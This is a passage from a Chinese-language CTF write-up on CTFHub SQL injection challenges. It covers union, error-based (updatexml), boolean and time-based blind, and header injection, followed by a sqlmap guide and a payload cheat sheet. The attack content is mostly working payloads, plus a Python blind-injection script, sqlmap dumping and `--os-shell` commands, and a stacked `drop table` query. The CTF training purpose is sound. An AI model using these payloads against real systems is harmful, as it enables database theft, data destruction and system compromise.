`#` 是注释符，把后面多余的引号注释掉。`1=1` 正常、`1=2` 为空，说明闭合成功。

浏览器地址栏里 `#` 会被当成锚点，要 URL 编码成 `%23`：

```text
?id=1' and 1=1%23
```

**第二步：判断列数**

```text
?id=1' order by 2%23
?id=1' order by 3%23
```

**第三步：联合查询**

```text
?id=-1' union select 1,2%23
?id=-1' union select 1,database()%23
?id=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23
?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'%23
?id=-1' union select 1,group_concat(flag) from flag%23
```

### 总结

- 字符型多了一步“闭合 + 注释”：`1' ... #`。
- `#` 在 URL 里必须写成 `%23`；Burp 里可以直接写 `#`。
- 如果 `#` 被过滤，用 `-- `（注意后面有一个空格）或者 `and '1'='1` 闭合。
- 如果空格被过滤，用 `/**/`、`%09`、`%0a` 代替。

---

## 4. CTFHub 报错注入

### 题目

页面不回显查询结果，但会显示 SQL 报错。

### 思路

**第一步：确认报错**

```text
?id=1 and updatexml(1,concat(0x7e,(select database())),1)
```

页面出现：

```text
XPATH syntax error: '~sqli'
```

`~` 是我们用 `0x7e` 拼进去的分隔符，`sqli` 就是当前数据库名。

**第二步：爆表**

```text
?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)
```

如果报错信息太长被截断（`updatexml` 大约只显示 32 个字符），用 `substr` 分段：

```text
?id=1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,20)),1)
?id=1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),21,20)),1)
```

**第三步：爆字段**

```text
?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag')),1)
```

**第四步：爆数据**

```text
?id=1 and updatexml(1,concat(0x7e,(select flag from flag limit 0,1)),1)
```

### 总结

- 报错注入的三个常用函数：`updatexml()`、`extractvalue()`、`floor(rand(0)*2)`。
- `concat(0x7e, ...)` 里的 `0x7e` 是 `~`，用来在报错信息里定位数据。
- `updatexml` / `extractvalue` 回显长度有限，数据长就用 `substr()` 分段。
- 如果 `updatexml` 被过滤，换 `extractvalue(1,concat(0x7e,...))`，或者 `and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)`。

---

## 5. CTFHub 布尔盲注 / 时间盲注

### 题目

页面既没有查询结果，也没有报错，只能通过“页面是否正常”或“响应时间”判断。

### 布尔盲注思路

先找“真 / 假”的差异：

```text
?id=1 and 1=1
?id=1 and 1=2
```

前者正常显示，后者空白 / 显示不存在，这就是布尔信道。

然后逐字猜：

```text
?id=1 and substr(database(),1,1)='s'
?id=1 and substr(database(),1,1)='q'
```

`substr(str, pos, len)` 从第 `pos` 个字符开始取 `len` 个；`ascii()` 可以把字符转成数字，二分更快：

```text
?id=1 and ascii(substr(database(),1,1))>100
?id=1 and ascii(substr(database(),1,1))>110
```

### 布尔盲注脚本

```python
import requests
import string

url = "http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/"
chars = string.ascii_lowercase + string.digits + "_{}-"

def is_true(payload):
    r = requests.get(url, params={"id": payload}, timeout=5)
    # 这里的判断标志要按题目改：状态码、长度、关键字都可以
    return "You are in" in r.text

result = ""
for pos in range(1, 50):
    found = False
    for ch in chars:
        payload = f"1 and substr(database(),{pos},1)='{ch}'#"
        if is_true(payload):
            result += ch
            print(result)
            found = True
            break
    if not found:
        break

print("database =", result)
```

把 `database()` 换成 `(select group_concat(table_name) from information_schema.tables where table_schema=database())`，就能继续爆表；换 `flag` 就能爆数据。

### 时间盲注思路

用 `sleep()` 制造时间差：

```text
?id=1 and if(substr(database(),1,1)='s',sleep(3),0)
```

如果第一个字符是 `s`，页面会卡 3 秒；否则立即返回。用响应时间判断：

```python
import requests
import time

def is_true(payload):
    start = time.time()
    requests.get(url, params={"id": payload}, timeout=10)
    return time.time() - start > 2.5
```

时间盲注的关键是**先测基线**：正常请求耗时多少、`sleep(3)` 耗时多少，取中间值做阈值。网络抖动大时把 `sleep` 调大，或者多次测量取平均。

### 总结

- 布尔盲注：找“真 / 假”的页面差异，逐字猜。
- 时间盲注：用 `if(condition, sleep(n), 0)` 制造时间差。
- 脚本比手工快，但要先确认判断标志（关键字、长度、状态码、时间）。
- `substr`、`ascii`、`limit` 是盲注三件套；MySQL 还可以用 `mid()`、`left()`、`right()`。

---

## 6. CTFHub HTTP Header 注入

### 题目

注入点不在 URL 参数里，而在 `User-Agent`、`Referer`、`Cookie` 这些请求头里。后台会把它们写进日志 / 数据库，如果直接拼接 SQL 就有注入。

### UA 注入

Burp 抓包，把 `User-Agent` 改成：

```http
User-Agent: ' or updatexml(1,concat(0x7e,database()),1) or '
```

放包，页面报错里出现数据库名。

### Referer 注入

```http
Referer: ' or updatexml(1,concat(0x7e,database()),1) or '
```

### Cookie 注入

```http
Cookie: id=1' or updatexml(1,concat(0x7e,database()),1)#
```

或者：

```http
Cookie: id=1' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
```

### 总结

- 注入点不只在输入框：`User-Agent`、`Referer`、`Cookie`、`X-Forwarded-For`、`Client-IP` 都可能是。
- 头部注入通常用报错注入最方便，因为页面不一定回显查询结果。
- sqlmap 测头部要加 `--level`：Cookie 默认 level 2，UA / Referer 需要 level 3。

---

## 7. sqlmap 一把梭

### 基础命令

```bash
# 判断注入点
python sqlmap.py -u "http://target/?id=1" --batch

# 爆所有库
python sqlmap.py -u "http://target/?id=1" --dbs --batch

# 爆当前库的表
python sqlmap.py -u "http://target/?id=1" -D sqli --tables --batch

# 爆字段
python sqlmap.py -u "http://target/?id=1" -D sqli -T flag --columns --batch

# 爆数据
python sqlmap.py -u "http://target/?id=1" -D sqli -T flag --dump --batch
```

### POST 注入

```bash
python sqlmap.py -u "http://target/login.php" \
  --data="username=admin&password=1" \
  --batch --dbs
```

### Cookie / Header 注入

```bash
# Cookie 注入
python sqlmap.py -u "http://target/" --cookie="id=1" --level 2 --batch --dbs

# UA / Referer 注入
python sqlmap.py -u "http://target/" --level 3 --batch --dbs
```

### 指定技术

```bash
--technique=U   # union
--technique=E   # error
--technique=B   # boolean
--technique=T   # time
--technique=UET # 组合
```

### 常用附加参数

```bash
--current-db        # 当前库
--current-user      # 当前用户
--is-dba            # 是否 DBA
--os-shell          # 尝试拿系统 shell（权限够才行）
--tamper=space2comment  # 绕空格过滤
--random-agent      # 随机 UA
--proxy=http://127.0.0.1:8080  # 走 Burp 看流量
```

### 总结

- sqlmap 不是万能的：有 WAF、参数不固定、JSON 嵌套、加密参数时，先手工确认注入点，再用 `--data` / `--cookie` / `-r` 喂给工具。
- `-r request.txt` 可以直接读 Burp 保存的整个请求，最适合复杂 POST / JSON。
-  `--os-shell`，权限不够会浪费时间；先把库拖出来。

---

## 8. SQL 注入 WP 速查表

| 题型 | 判断方式 | 核心 payload |
| --- | --- | --- |
| 数字型 | `id=1 and 1=1` / `1=2` | `id=-1 union select 1,2` |
| 字符型 | `id=1'` 报错 | `id=-1' union select 1,2#` |
| 搜索型 | `like '%x%'` | `x%' union select 1,2#` |
| 报错型 | 页面有 SQL 报错 | `and updatexml(1,concat(0x7e,database()),1)` |
| 布尔盲注 | 真假页面不同 | `and substr(database(),1,1)='s'` |
| 时间盲注 | 页面无差异 | `and if(substr(database(),1,1)='s',sleep(3),0)` |
| Header | 参数在头部 | `User-Agent: ' or updatexml(...) or '` |
| JSON | `Content-Type: application/json` | `{"username":"admin' or 1=1#"}` |
| 宽字节 | 单引号被转义 | `%df' or 1=1#` |
| 堆叠 | 支持多语句 | `1'; drop table test;-- ` |
| 二次注入 | 存入后再拼接 | 先存 `admin'#`，再触发查询 |
